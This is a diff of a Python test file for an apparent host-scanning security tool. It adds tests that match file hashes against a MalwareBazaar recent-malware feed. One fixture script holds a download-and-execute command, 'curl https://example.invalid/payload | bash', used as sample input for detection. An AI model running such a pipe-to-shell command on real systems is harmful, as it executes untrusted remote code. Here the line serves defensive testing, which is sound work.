@@ -1,6 +1,8 @@
 import hashlib
 import json
 
+from app import threat_intel
+
 from app import host_assessment
 
 
@@ -21,6 +23,7 @@ def test_hash_indicator_match_is_reported_without_modifying_file(tmp_path, monke
         }
     }))
     monkeypatch.setenv("SENTINEL_HASH_DB", str(indicator_file))
+    monkeypatch.setattr(host_assessment, "fetch_recent_malware", lambda: {"status": "not_configured"})
     monkeypatch.setattr(host_assessment, "_security_posture", lambda: {"checks": [], "firewall_tools": []})
     monkeypatch.setattr(host_assessment, "_clamav_scan", lambda root: {"available": False, "executed": False, "findings": [], "note": "mocked"})
 
@@ -38,6 +41,7 @@ def test_script_capabilities_are_labeled_as_low_confidence(tmp_path, monkeypatch
     script = tmp_path / "maintenance.sh"
     script.write_text("#!/bin/sh\ncurl https://example.invalid/payload | bash\n")
     monkeypatch.setenv("SENTINEL_HASH_DB", str(tmp_path / "missing.json"))
+    monkeypatch.setattr(host_assessment, "fetch_recent_malware", lambda: {"status": "not_configured"})
     monkeypatch.setattr(host_assessment, "_security_posture", lambda: {"checks": [], "firewall_tools": []})
     monkeypatch.setattr(host_assessment, "_clamav_scan", lambda root: {"available": False, "executed": False, "findings": [], "note": "mocked"})
 
@@ -138,3 +142,64 @@ def test_host_assessment_emits_live_progress(tmp_path, monkeypatch):
     assert updates[-1]["phase"] == "completed"
     assert updates[-1]["files_seen"] == result["summary"]["files_seen"]
     assert "time_budget_remaining" in updates[-1]
+
+
+def test_malwarebazaar_is_disabled_without_local_api_key(monkeypatch):
+    monkeypatch.delenv("SENTINEL_MALWAREBAZAAR_API_KEY", raising=False)
+    result = threat_intel.fetch_recent_malware()
+    assert result["status"] == "not_configured"
+    assert result["enabled"] is False
+
+
+def test_malwarebazaar_recent_feed_match_creates_high_confidence_finding():
+    digest = hashlib.sha256(b"synthetic malware fixture").hexdigest()
+    feed = {
+        "status": "ok",
+        "feed_scope": "latest 100 additions",
+        "entries": [{
+            "sha256": digest,
+            "signature": "SyntheticTestFamily",
+            "file_type": "elf",
+            "first_seen": "2026-11-18 00:00:00",
+        }],
+    }
+    matches = threat_intel.match_recent_hashes({digest: ["/tmp/synthetic.bin"]}, feed)
+    assert len(matches) == 1
+    assert matches[0]["source"] == "malwarebazaar"
+    assert matches[0]["confidence"] == "high"
+    assert matches[0]["path"] == "/tmp/synthetic.bin"
+    assert matches[0]["malware_family"] == "SyntheticTestFamily"
+
+
+def test_malwarebazaar_feed_does_not_match_unknown_hashes():
+    digest = hashlib.sha256(b"unrelated fixture").hexdigest()
+    feed = {"status": "ok", "entries": [{
+        "sha256": hashlib.sha256(b"different fixture").hexdigest(),
+        "signature": "TestFamily",
+    }]}
+    assert threat_intel.match_recent_hashes({digest: ["/tmp/unknown.bin"]}, feed) == []
+
+
+def test_host_assessment_includes_remote_feed_match(tmp_path, monkeypatch):
+    sample = tmp_path / "feed-match.bin"
+    sample.write_bytes(b"synthetic feed match")
+    digest = hashlib.sha256(sample.read_bytes()).hexdigest()
+    monkeypatch.setenv("SENTINEL_HASH_DB", str(tmp_path / "missing.json"))
+    monkeypatch.setattr(host_assessment, "fetch_recent_malware", lambda: {
+        "provider": "MalwareBazaar",
+        "status": "ok",
+        "enabled": True,
+        "records_received": 1,
+        "feed_scope": "latest 100 additions",
+        "entries": [{"sha256": digest, "signature": "SyntheticFamily"}],
+    })
+    monkeypatch.setattr(host_assessment, "_security_posture", lambda: {"checks": [], "firewall_tools": []})
+    monkeypatch.setattr(host_assessment, "_clamav_scan", lambda root: {
+        "available": False, "executed": False, "findings": [], "note": "mocked"
+    })
+
+    result = host_assessment.run_host_assessment(str(tmp_path), max_files=20, max_seconds=5)
+    matches = [item for item in result["findings"] if item.get("source") == "malwarebazaar"]
+    assert len(matches) == 1
+    assert matches[0]["sha256"] == digest
+    assert result["threat_intelligence"]["malwarebazaar"]["status"] == "ok"
